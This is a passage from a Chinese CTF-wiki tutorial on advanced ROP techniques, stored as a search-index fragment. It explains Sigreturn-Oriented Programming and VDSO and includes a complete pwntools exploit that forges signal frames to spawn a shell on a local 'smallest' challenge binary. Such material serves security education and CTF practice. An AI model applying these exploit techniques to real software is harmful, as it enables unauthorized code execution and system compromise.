00000020 6e 6b 45 32 52 76 73 6c 00 1e 00 00 00 00 00 00 \u2502nkE2\u2502Rvsl\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 00000030 00 00 00 00 12 00 00 00 73 79 73 74 65 6d 00 74 \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502syst\u2502em\u00b7t\u2502 00000040 5a 4f 4e 6c 6c 73 4b 5a 76 53 48 6e 38 37 49 47 \u2502ZONl\u2502lsKZ\u2502vSHn\u250287IG\u2502 00000050 69 49 52 6c 50 44 38 67 45 77 75 6c 72 47 6f 67 \u2502iIRl\u2502PD8g\u2502Ewul\u2502rGog\u2502 00000060 55 41 52 4f \u2502UARO\u2502\u2502 00000064 [ * ] Switching to interactive mode $ ls [ DEBUG ] Sent 0x3 bytes: 'ls\\n' [ DEBUG ] Received 0x8d bytes: 'core\\t main roptool.py roputils.pyc\\tstage2.py stage4.py stage6.py\\n' '__init__.py main.c roputils.py stage1.py\\tstage3.py stage5.py\\n' core main roptool.py roputils.pyc stage2.py stage4.py stage6.py __init__.py main.c roputils.py stage1.py stage3.py stage5.py \u9898\u76ee \u00b6 SROP \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 SROP(Sigreturn Oriented Programming)\u4e8e2014\u5e74\u88abVrije Universiteit Amsterdam\u7684Erik Bosman\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76 Framing Signals \u2014 A Return to Portable Shellcode \u53d1\u8868\u5728\u5b89\u5168\u9876\u7ea7\u4f1a\u8bae Oakland 2014 \u4e0a\uff0c\u88ab\u8bc4\u9009\u4e3a\u5f53\u5e74\u7684 Best Student Papers \u3002\u5176\u4e2d\u76f8\u5173\u7684paper\u4ee5\u53caslides\u7684\u94fe\u63a5\u5982\u4e0b\uff1a paper slides \u5176\u4e2d\uff0c sigreturn \u662f\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5728\u7c7bunix\u7cfb\u7edf\u53d1\u751fsignal\u7684\u65f6\u5019\u4f1a\u88ab\u95f4\u63a5\u5730\u8c03\u7528\u3002 signal\u673a\u5236 \u00b6 signal\u673a\u5236\u662f\u7c7bunix\u7cfb\u7edf\u4e2d\u8fdb\u7a0b\u4e4b\u95f4\u76f8\u4e92\u4f20\u9012\u4fe1\u606f\u7684\u4e00\u79cd\u65b9\u6cd5\u3002\u4e00\u822c\uff0c\u6211\u4eec\u4e5f\u79f0\u5176\u4e3a\u8f6f\u4e2d\u65ad\u4fe1\u53f7\uff0c\u6216\u8005\u8f6f\u4e2d\u65ad\u3002\u6bd4\u5982\u8bf4\uff0c\u8fdb\u7a0b\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528kill\u6765\u53d1\u9001\u8f6f\u4e2d\u65ad\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4fe1\u53f7\u673a\u5236\u5e38\u89c1\u7684\u6b65\u9aa4\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u5185\u6838\u5411\u67d0\u4e2a\u8fdb\u7a0b\u53d1\u9001signal\u673a\u5236\uff0c\u8be5\u8fdb\u7a0b\u4f1a\u88ab\u6682\u65f6\u6302\u8d77\uff0c\u8fdb\u5165\u5185\u6838\u6001\u3002 \u5185\u6838\u4f1a\u4e3a\u8be5\u8fdb\u7a0b\u4fdd\u5b58\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c \u4e3b\u8981\u662f\u5c06\u6240\u6709\u5bc4\u5b58\u5668\u538b\u5165\u6808\u4e2d\uff0c\u4ee5\u53ca\u538b\u5165signal\u4fe1\u606f\uff0c\u4ee5\u53ca\u6307\u5411sigreturn\u7684\u7cfb\u7edf\u8c03\u7528\u5730\u5740 \u3002\u6b64\u65f6\u6808\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u79f0ucontext\u4ee5\u53casiginfo\u8fd9\u4e00\u6bb5\u4e3aSignal Frame\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e00\u90e8\u5206\u662f\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u7684\u3002 \u4e4b\u540e\u4f1a\u8df3\u8f6c\u5230\u6ce8\u518c\u8fc7\u7684signal handler\u4e2d\u5904\u7406\u76f8\u5e94\u7684signal\u3002\u56e0\u6b64\uff0c\u5f53signal handler\u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u5c31\u4f1a\u6267\u884csigreturn\u4ee3\u7801\u3002 \u5bf9\u4e8esignal Frame\u6765\u8bf4\uff0c\u4e0d\u540c\u4f1a\u56e0\u4e3a\u67b6\u6784\u7684\u4e0d\u540c\u800c\u56e0\u6b64\u6709\u6240\u533a\u522b\uff0c\u8fd9\u91cc\u7ed9\u51fa\u5206\u522b\u7ed9\u51fax86\u4ee5\u53cax64\u7684sigcontext x86 struct sigcontext { unsigned short gs , __gsh ; unsigned short fs , __fsh ; unsigned short es , __esh ; unsigned short ds , __dsh ; unsigned long edi ; unsigned long esi ; unsigned long ebp ; unsigned long esp ; unsigned long ebx ; unsigned long edx ; unsigned long ecx ; unsigned long eax ; unsigned long trapno ; unsigned long err ; unsigned long eip ; unsigned short cs , __csh ; unsigned long eflags ; unsigned long esp_at_signal ; unsigned short ss , __ssh ; struct _fpstate * fpstate ; unsigned long oldmask ; unsigned long cr2 ; }; x64 struct _fpstate { /* FPU environment matching the 64-bit FXSAVE layout. */ __uint16_t cwd ; __uint16_t swd ; __uint16_t ftw ; __uint16_t fop ; __uint64_t rip ; __uint64_t rdp ; __uint32_t mxcsr ; __uint32_t mxcr_mask ; struct _fpxreg _st [ 8 ]; struct _xmmreg _xmm [ 16 ]; __uint32_t padding [ 24 ]; }; struct sigcontext { __uint64_t r8 ; __uint64_t r9 ; __uint64_t r10 ; __uint64_t r11 ; __uint64_t r12 ; __uint64_t r13 ; __uint64_t r14 ; __uint64_t r15 ; __uint64_t rdi ; __uint64_t rsi ; __uint64_t rbp ; __uint64_t rbx ; __uint64_t rdx ; __uint64_t rax ; __uint64_t rcx ; __uint64_t rsp ; __uint64_t rip ; __uint64_t eflags ; unsigned short cs ; unsigned short gs ; unsigned short fs ; unsigned short __pad0 ; __uint64_t err ; __uint64_t trapno ; __uint64_t oldmask ; __uint64_t cr2 ; __extension__ union { struct _fpstate * fpstate ; __uint64_t __fpstate_word ; }; __uint64_t __reserved1 [ 8 ]; }; signal handler\u8fd4\u56de\u540e\uff0c\u5185\u6838\u4e3a\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\uff0c\u4e3a\u8be5\u8fdb\u7a0b\u6062\u590d\u4e4b\u524d\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u5176\u4e2d\u5305\u62ec\u5c06\u6240\u6709\u538b\u5165\u7684\u5bc4\u5b58\u5668\uff0c\u91cd\u65b0pop\u56de\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6700\u540e\u6062\u590d\u8fdb\u7a0b\u7684\u6267\u884c\u3002\u5176\u4e2d\uff0c32\u4f4d\u7684sigreturn\u7684\u8c03\u7528\u53f7\u4e3a77\uff0c64\u4f4d\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u4ed4\u7ec6\u56de\u987e\u4e00\u4e0b\u5185\u6838\u5728signal\u4fe1\u53f7\u5904\u7406\u7684\u8fc7\u7a0b\u4e2d\u7684\u5de5\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u5185\u6838\u4e3b\u8981\u505a\u7684\u5de5\u4f5c\u5c31\u662f\u4e3a\u8fdb\u7a0b\u4fdd\u5b58\u4e0a\u4e0b\u6587\uff0c\u5e76\u4e14\u6062\u590d\u4e0a\u4e0b\u6587\u3002\u8fd9\u4e2a\u4e3b\u8981\u7684\u53d8\u52a8\u90fd\u5728Signal Frame\u4e2d\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a Signal Frame\u88ab\u4fdd\u5b58\u5728\u7528\u6237\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\uff0c\u6240\u4ee5\u7528\u6237\u662f\u53ef\u4ee5\u8bfb\u5199\u7684\u3002 \u7531\u4e8e\u5185\u6838\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u65e0\u5173(kernel agnostic about signal handlers)\uff0c\u5b83\u5e76\u4e0d\u4f1a\u53bb\u8bb0\u5f55\u8fd9\u4e2asignal\u5bf9\u5e94\u7684Signal Frame\uff0c\u6240\u4ee5\u5f53\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u6b64\u65f6\u7684Signal Frame\u5e76\u4e0d\u4e00\u5b9a\u662f\u4e4b\u524d\u5185\u6838\u4e3a\u7528\u6237\u8fdb\u7a0b\u4fdd\u5b58\u7684Signal Frame\u3002 \u8bf4\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\uff0cSROP\u7684\u57fa\u672c\u5229\u7528\u539f\u7406\u4e5f\u5c31\u51fa\u73b0\u4e86\u3002\u4e0b\u9762\u4e3e\u4e24\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002 \u83b7\u53d6shell \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u5047\u8bbe\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7528\u6237\u8fdb\u7a0b\u7684\u6808\uff0c\u90a3\u4e48\u5b83\u5c31\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2aSignal Frame\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fd9\u91cc\u4ee564\u4f4d\u4e3a\u4f8b\u5b50\uff0c\u7ed9\u51faSignal Frame\u66f4\u52a0\u8be6\u7ec6\u7684\u4fe1\u606f \u5f53\u7cfb\u7edf\u6267\u884c\u5b8csigreturn\u7cfb\u7edf\u8c03\u7528\u4e4b\u540e\uff0c\u4f1a\u6267\u884c\u4e00\u7cfb\u5217\u7684pop\u6307\u4ee4\u4ee5\u4fbf\u4e8e\u6062\u590d\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f53\u6267\u884c\u5230rip\u65f6\uff0c\u5c31\u4f1a\u5c06\u7a0b\u5e8f\u6267\u884c\u6d41\u6307\u5411syscall\u5730\u5740\uff0c\u6839\u636e\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\uff0c\u4fbf\u4f1a\u5f97\u5230\u4e00\u4e2ashell\u3002 system call chains \u00b6 \u9700\u8981\u6307\u51fa\u7684\u662f\uff0c\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u53ea\u662f\u5355\u72ec\u7684\u83b7\u5f97\u4e00\u4e2ashell\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u5e0c\u671b\u6267\u884c\u4e00\u7cfb\u5217\u7684\u51fd\u6570\u3002\u6211\u4eec\u53ea\u9700\u8981\u505a\u4e24\u5904\u4fee\u6539\u5373\u53ef \u63a7\u5236\u6808\u6307\u9488\u3002 \u628a\u539f\u6765rip\u6307\u5411\u7684 syscall gadget\u6362\u6210 syscall; ret gadget\u3002 \u5982\u4e0b\u56fe\u6240\u793a \uff0c\u8fd9\u6837\u5f53\u6bcf\u6b21syscall\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u6808\u6307\u9488\u90fd\u4f1a\u6307\u5411\u4e0b\u4e00\u4e2aSignal Frame\u3002\u56e0\u6b64\u5c31\u53ef\u4ee5\u6267\u884c\u4e00\u7cfb\u5217\u7684sigreturn\u51fd\u6570\u8c03\u7528\u3002 \u540e\u7eed \u00b6 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728\u6784\u9020ROP\u653b\u51fb\u7684\u65f6\u5019\uff0c\u9700\u8981\u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6 \u53ef\u4ee5\u901a\u8fc7\u6808\u6ea2\u51fa\u6765\u63a7\u5236\u6808\u7684\u5185\u5bb9 \u9700\u8981\u77e5\u9053\u76f8\u5e94\u7684\u5730\u5740 \"/bin/sh\" Signal Frame syscal sigreturn \u9700\u8981\u6709\u591f\u5927\u7684\u7a7a\u95f4\u6765\u585e\u4e0b\u6574\u4e2asigal frame \u6b64\u5916\uff0c\u5173\u4e8esigreturn\u4ee5\u53casyscall;ret\u8fd9\u4e24\u4e2agadget\u5728\u4e0a\u9762\u5e76\u6ca1\u6709\u63d0\u53ca\u3002\u63d0\u51fa\u8be5\u653b\u51fb\u7684\u8bba\u6587\u4f5c\u8005\u53d1\u73b0\u4e86\u8fd9\u4e9bgadgets\u51fa\u73b0\u7684\u67d0\u4e9b\u5730\u5740\uff1a \u5e76\u4e14\uff0c\u4f5c\u8005\u53d1\u73b0\uff0c\u6709\u4e9b\u7cfb\u7edf\u4e0aSROP\u7684\u5730\u5740\u88ab\u968f\u673a\u5316\u4e86\uff0c\u800c\u6709\u4e9b\u5219\u6ca1\u6709\u3002\u6bd4\u5982\u8bf4 Linux < 3.3 x86_64 \uff08\u5728Debian 7.0\uff0c Ubuntu Long Term Support\uff0c CentOS 6\u7cfb\u7edf\u4e2d\u9ed8\u8ba4\u5185\u6838\uff09\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728vsyscall\u4e2d\u7684\u56fa\u5b9a\u5730\u5740\u5904\u627e\u5230syscall&return\u4ee3\u7801\u7247\u6bb5\u3002\u5982\u4e0b \u4f46\u662f\u76ee\u524d\u5b83\u5df2\u7ecf\u88ab vsyscall-emulate \u548c vdso \u673a\u5236\u4ee3\u66ff\u4e86\u3002\u6b64\u5916\uff0c\u76ee\u524d\u5927\u591a\u6570\u7cfb\u7edf\u90fd\u4f1a\u5f00\u542fASLR\u4fdd\u62a4\uff0c\u6240\u4ee5\u76f8\u5bf9\u6765\u8bf4\u8fd9\u4e9bgadgets\u90fd\u5e76\u4e0d\u5bb9\u6613\u627e\u5230\u3002 \u503c\u5f97\u4e00\u8bf4\u7684\u662f\uff0c\u5bf9\u4e8esigreturn\u7cfb\u7edf\u8c03\u7528\u6765\u8bf4\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e2d\uff0csigreturn\u7cfb\u7edf\u8c03\u7528\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\uff0c\u53ea\u9700\u8981RAX=15\uff0c\u5e76\u4e14\u6267\u884csyscall\u5373\u53ef\u5b9e\u73b0\u8c03\u7528syscall\u8c03\u7528\u3002\u800cRAX\u5bc4\u5b58\u5668\u7684\u503c\u53c8\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6765\u95f4\u63a5\u63a7\u5236\uff0c\u6bd4\u5982\u8bf4read\u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002 \u5229\u7528\u5de5\u5177 \u00b6 \u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u76ee\u524d\u7684pwntools\u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86\u5bf9\u4e8esrop\u7684\u653b\u51fb\u3002 \u793a\u4f8b \u00b6 \u8fd9\u91cc\u4ee5360\u6625\u79cb\u676f\u4e2d\u7684smallest-pwn\u4e3a\u4f8b\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b \u786e\u5b9a\u6587\u4ef6\u57fa\u672c\u4fe1\u606f \u279c smallest file smallest smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped \u53ef\u4ee5\u770b\u5230\u8be5\u7a0b\u5e8f\u4e3a64\u4f4d\u9759\u6001\u94fe\u63a5\u7248\u672c\u3002 \u68c0\u67e5\u4fdd\u62a4 \u279c smallest checksec smallest Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002 \u6f0f\u6d1e\u53d1\u73b0 \u5b9e\u7528IDA\u76f4\u63a5\u53cd\u7f16\u8bd1\u770b\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u7a0b\u5e8f\u5c31\u51e0\u884c\u6c47\u7f16\u4ee3\u7801\uff0c\u5982\u4e0b public start start proc near xor rax , rax mov edx , 400 h mov rsi , rsp mov rdi , rax syscall retn start endp \u6839\u636esyscall\u7684\u7f16\u53f7\u4e3a0\uff0c\u53ef\u4ee5\u77e5\u9053\u8be5\u7a0b\u5e8f\u6267\u884c\u7684\u6307\u4ee4\u4e3aread(0,$rsp,400)\uff0c\u5373\u5411\u6808\u9876\u8bfb\u5165400\u4e2a\u5b57\u7b26\u3002\u6beb\u65e0\u7591\u95ee\uff0c\u8fd9\u4e2a\u662f\u6709\u6808\u6ea2\u51fa\u7684\u3002 \u5229\u7528\u601d\u8def \u7531\u4e8e\u7a0b\u5e8f\u4e2d\u5e76\u6ca1\u6709sigreturn\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u81ea\u5df1\u6784\u9020\uff0c\u6b63\u597d\u8fd9\u91cc\u6709read\u51fd\u6570\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7read\u51fd\u6570\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u6765\u8bbe\u7f6erax\u7684\u503c\u3002\u91cd\u8981\u601d\u8def\u5982\u4e0b \u901a\u8fc7\u63a7\u5236read\u8bfb\u53d6\u7684\u5b57\u7b26\u6570\u6765\u8bbe\u7f6eRAX\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4ece\u800c\u6267\u884csigreturn \u901a\u8fc7syscall\u6267\u884cexecve(\"/bin/sh\",0,0)\u6765\u83b7\u53d6shell\u3002 \u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f from pwn import * from LibcSearcher import * small = ELF ( './smallest' ) if args [ 'REMOTE' ]: sh = remote ( '127.0.0.1' , 7777 ) else : sh = process ( './smallest' ) context . arch = 'amd64' context . log_level = 'debug' syscall_ret = 0x00000000004000BE start_addr = 0x00000000004000B0 ## set start addr three times payload = p64 ( start_addr ) * 3 sh . send ( payload ) ## modify the return addr to start_addr+3 ## so that skip the xor rax,rax; then the rax=1 ## get stack addr sh . send ( ' \\xb3 ' ) stack_addr = u64 ( sh . recv ()[ 8 : 16 ]) log . success ( 'leak stack addr :' + hex ( stack_addr )) ## make the rsp point to stack_addr ## the frame is read(0,stack_addr,0x400) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_read sigframe . rdi = 0 sigframe . rsi = stack_addr sigframe . rdx = 0x400 sigframe . rsp = stack_addr sigframe . rip = syscall_ret payload = p64 ( start_addr ) + 'a' * 8 + str ( sigframe ) sh . send ( payload ) ## set rax=15 and call sigreturn sigreturn = p64 ( syscall_ret ) + 'b' * 7 sh . send ( sigreturn ) ## call execv(\"/bin/sh\",0,0) sigframe = SigreturnFrame () sigframe . rax = constants . SYS_execve sigframe . rdi = stack_addr + 0x120 # \"/bin/sh\" 's addr sigframe . rsi = 0x0 sigframe . rdx = 0x0 sigframe . rsp = stack_addr sigframe . rip = syscall_ret frame_payload = p64 ( start_addr ) + 'b' * 8 + str ( sigframe ) print len ( frame_payload ) payload = frame_payload + ( 0x120 - len ( frame_payload )) * ' \\x00 ' + '/bin/sh \\x00 ' sh . send ( payload ) sh . send ( sigreturn ) sh . interactive () \u5176\u57fa\u672c\u6d41\u7a0b\u4e3a \u8bfb\u53d6\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740 \u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5229\u7528\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8bfb\u53d6\u5730\u5740\uff0c\u4fee\u6539\u8fd4\u56de\u5730\u5740(\u5373\u7b2c\u4e8c\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740)\u4e3a\u6e90\u7a0b\u5e8f\u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u5e76\u4e14\u4f1a\u8bbe\u7f6erax=1 \u90a3\u4e48\u6b64\u65f6\u5c06\u4f1a\u6267\u884cwrite(1,$esp,0x400)\uff0c\u6cc4\u9732\u6808\u5730\u5740\u3002 \u5229\u7528\u7b2c\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8fdb\u800c\u8bfb\u5165payload \u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u8fdb\u800c\u5c06\u5411\u6808\u5730\u5740\u6240\u5728\u4f4d\u7f6e\u8bfb\u5165\u6570\u636e\uff0c\u6784\u9020execve('/bin/sh',0,0) \u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002 \u9898\u76ee \u00b6 Defcon 2015 Qualifier: fuckup \u53c2\u8003\u9605\u8bfb Sigreturn Oriented Programming (SROP) Attack\u653b\u51fb\u539f\u7406 SROP by Angle Baby \u7cfb\u7edf\u8c03\u7528 ret2VDSO \u00b6 VDSO\u4ecb\u7ecd \u00b6 \u4ec0\u4e48\u662fVDSO(Virtual Dynamically-linked Shared Object)\u5462\uff1f\u542c\u5176\u540d\u5b57\uff0c\u5927\u6982\u662f\u865a\u62df\u52a8\u6001\u94fe\u63a5\u5171\u4eab\u5bf9\u8c61\uff0c\u6240\u4ee5\u8bf4\u5b83\u5e94\u8be5\u662f\u865a\u62df\u7684\uff0c\u4e0e\u865a\u62df\u5185\u5b58\u4e00\u76f4\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\u672c\u8eab\u5e76\u4e0d\u5b58\u5728\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u662f\u5c06\u5185\u6838\u6001\u7684\u8c03\u7528\u6620\u5c04\u5230\u7528\u6237\u5730\u5740\u7a7a\u95f4\u7684\u5e93\u3002\u90a3\u4e48\u5b83\u4e3a\u4ec0\u4e48\u4f1a\u5b58\u5728\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6709\u4e9b\u7cfb\u7edf\u8c03\u7528\u7ecf\u5e38\u88ab\u7528\u6237\u4f7f\u7528\uff0c\u8fd9\u5c31\u4f1a\u51fa\u73b0\u5927\u91cf\u7684\u7528\u6237\u6001\u4e0e\u5185\u6838\u6001\u5207\u6362\u7684\u5f00\u9500\u3002\u901a\u8fc7vdso\uff0c\u6211\u4eec\u53ef\u4ee5\u5927\u91cf\u51cf\u5c11\u8fd9\u6837\u7684\u5f00\u9500\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u7684\u8def\u5f84\u66f4\u597d\u3002\u8fd9\u91cc\u8def\u5f84\u66f4\u597d\u6307\u7684\u662f\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u4f7f\u7528\u4f20\u7edf\u7684int 0x80\u6765\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4e0d\u540c\u7684\u5904\u7406\u5668\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4 intel\u5b9e\u73b0\u4e86sysenter\uff0csysexit amd\u5b9e\u73b0\u4e86syscall\uff0csysret \u5f53\u4e0d\u540c\u7684\u5904\u7406\u5668\u67b6\u6784\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u6307\u4ee4\u65f6\uff0c\u81ea\u7136\u5c31\u4f1a\u51fa\u73b0\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u6240\u4ee5linux\u5b9e\u73b0\u4e86vsyscall\u63a5\u53e3\uff0c\u5728\u5e95\u5c42\u4f1a\u6839\u636e\u5177\u4f53\u7684\u7ed3\u6784\u6765\u8fdb\u884c\u5177\u4f53\u64cd\u4f5c\u3002\u800cvsyscall\u5c31\u5b9e\u73b0\u5728vdso\u4e2d\u3002 \u8fd9\u91cc\uff0c\u6211\u4eec\u987a\u4fbf\u6765\u770b\u4e00\u4e0bvdso\uff0c\u5728Linux(kernel 2.6 or upper)\u4e2d\u6267\u884cldd /bin/sh, \u4f1a\u53d1\u73b0\u6709\u4e2a\u540d\u5b57\u53eblinux-vdso.so.1(\u8001\u70b9\u7684\u7248\u672c\u662flinux-gate.so.1)\u7684\u52a8\u6001\u6587\u4ef6, \u800c\u7cfb\u7edf\u4e2d\u5374\u627e\u4e0d\u5230\u5b83, \u5b83\u5c31\u662fVDSO\u3002 \u4f8b\u5982: \u279c ~ ldd /bin/sh linux-vdso.so.1 = > ( 0x00007ffd8ebf2000 ) libc.so.6 = > /lib/x86_64-linux-gnu/libc.so.6 ( 0x00007f84ff2f9000 ) /lib64/ld-linux-x86-64.so.2 ( 0x0000560cae6eb000 ) \u9664\u4e86\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\uff0cglibc\u4e5f\u63d0\u4f9b\u4e86VDSO\u7684\u652f\u6301, open(), read(), write(), gettimeofday()\u90fd\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528VDSO\u4e2d\u7684\u5b9e\u73b0\u3002\u4f7f\u5f97\u8fd9\u4e9b\u8c03\u7528\u901f\u5ea6\u66f4\u5feb\u3002 \u5185\u6838\u65b0\u7279\u6027\u5728\u4e0d\u5f71\u54cdglibc\u7684\u60c5\u51b5\u4e0b\u4e5f\u53ef\u4ee5\u66f4\u5feb\u7684\u90e8\u7f72\u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5intel\u7684\u5904\u7406\u5668\u4e3a\u4f8b\uff0c\u8fdb\u884c\u7b80\u5355\u8bf4\u660e\u3002 \u5176\u4e2dsysenter\u7684\u53c2\u6570\u4f20\u9012\u65b9\u5f0f\u4e0eint 0x80\u4e00\u81f4\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u5e03\u7f6e\u597d function prolog\uff0832\u4f4d\u4e3a\u4f8b\uff09 push ebp mov ebp , esp \u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u6ca1\u6709\u63d0\u4f9bfuncttion prolog\u7684\u8bdd\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u53ef\u4ee5\u8fdb\u884c\u6808\u8fc1\u79fb\u7684gadgets\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6539\u53d8\u6808\u7684\u4f4d\u7f6e\u3002 \u539f\u7406 \u00b6 \u5f85\u8865\u5145\u3002 \u9898\u76ee \u00b6 Defcon 2015 Qualifier fuckup \u53c2\u8003 http://man7.org/linux/man-pages/man7/vdso.7.html http://adam8157.info/blog/2011/10/linux-vdso/ JOP \u00b6 Jump-oriented programming COP \u00b6 Call-oriented programming","title":"\u9ad8\u7ea7 ROP"},{"location":"pwn/stackoverflow/advanced_rop/#rop","text":"\u9ad8\u7ea7ROP\u5176\u5b9e\u548c\u4e00\u822c\u7684ROP\u57fa\u672c\u4e00\u6837\uff0c\u5176\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e\u5b83\u5229\u7528\u4e86\u4e00\u4e9b\u66f4\u52a0\u5e95\u5c42\u7684\u539f\u7406\u3002","title":"\u9ad8\u7ea7ROP"},{"location":"pwn/stackoverflow/advanced_rop/#ret2_dl_runtime_resolve","text":"","title":"ret2_dl_runtime_resolve"},{"location":"pwn/stackoverflow/advanced_rop/#_1","text":"\u8981\u60f3\u5f04\u61c2\u8fd9\u4e2aROP\u5229\u7528\u6280\u5de7\uff0c\u9700\u8981\u9996\u5148\u7406\u89e3ELF\u6587\u4ef6\u7684\u57fa\u672c\u7ed3\u6784\uff0c\u4ee5\u53ca\u52a8\u6001\u94fe\u63a5\u7684\u57fa\u672c\u8fc7\u7a0b\uff0c\u8bf7\u53c2\u8003executable\u4e2delf\u5bf9\u5e94\u7684\u4ecb\u7ecd\u3002\u8fd9\u91cc\u6211\u53ea\u7ed9\u51fa\u76f8\u5e94\u7684\u5229\u7528\u65b9\u5f0f\u3002 \u6211\u4eec\u77e5\u9053\u5728linux\u4e2d\u662f\u5229\u7528_dl_runtime_resolve(link_map_obj, reloc_index)\u6765\u5bf9\u52a8\u6001\u94fe\u63a5\u7684\u51fd\u6570\u8fdb\u884c\u91cd\u5b9a\u4f4d\u7684\u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u76f8\u5e94\u7684\u53c2\u6570\u4ee5\u53ca\u5176\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u662f\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u6790\u7684\u51fd\u6570\u4e86\u5462\uff1f\u7b54\u6848\u662f\u80af\u5b9a\u7684\u3002\u5177\u4f53\u5229\u7528\u65b9\u5f0f\u5982\u4e0b \u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570 \u7ed9\u5b9aLink_map\u4ee5\u53caindex\u4e24\u4e2a\u53c2\u6570\u3002 \u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7ed9\u5b9a 